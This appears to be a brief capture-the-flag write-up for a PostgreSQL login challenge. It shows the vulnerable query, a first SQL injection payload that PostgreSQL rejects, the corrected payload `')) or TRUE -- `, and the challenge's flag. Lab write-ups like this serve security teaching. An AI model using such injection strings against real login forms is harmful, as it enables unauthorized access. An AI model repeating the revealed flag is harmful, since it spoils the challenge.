# Po po po po postgresql Solution

This is the query: 
```
SELECT * FROM users WHERE (username = ('$username') AND ...
```

so, let's give this input: `')) or 1 -- `

however, i get this error, because this is PostgresSQL
![image](./images/Po%20po%20po%20po%20postgresql.png)

so, let's give it true value instead of 1:
`')) or TRUE -- `

**Flag:** ***`FLAG-mdeq68jNN88xLB1o2m8V33Ld`***
